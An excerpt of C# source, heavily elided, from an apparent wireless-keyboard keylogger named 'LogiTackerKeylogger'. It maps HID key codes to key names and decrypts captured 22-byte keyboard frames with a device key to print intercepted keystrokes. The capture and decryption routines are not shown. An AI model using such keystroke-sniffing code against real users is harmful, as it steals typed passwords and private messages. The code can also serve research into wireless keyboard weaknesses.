...
namespace LogiTackerKeylogger
{
    ...
    class KeyboardLayout
    {
        ...
        string ByteToKey(byte input)
        {
            switch (input)
            {
                ...
                case 0x01: return "Error Rollover";
                case 0x02: return "Post Fail";
                case 0x03: return "Error Undefined";
                case 0x04: return "A";
                case 0x05: return "B";
                case 0x06: return "C";
                case 0x07: return "D";
        ...
        public string ToKomboKeyPress(byte[] decryptedKeyboardFrame)
        {
            string output = "";
    ...
    class LogiTackerDecoder
    {
        public void DoDecoding(byte[] inputReportBuffer, byte[] DeviceKey)
        {
            AirFrame af = new AirFrame(inputReportBuffer);

            if (af.payloadLength != 22)
                return;

            byte[] Decrypted = af.DecryptKeyboardFrame(DeviceKey);

            //Console.WriteLine(BitConverter.ToString(Decrypted));

            KeyboardLayout EN = new KeyboardLayout();

            //af.toString();

            //if (EN.hasModKey(Decrypted))
                //Console.WriteLine(EN.ToModKey(Decrypted));

            if (!EN.isKeyup(Decrypted))
                Console.Write(EN.ToKomboKeyPress(Decrypted));
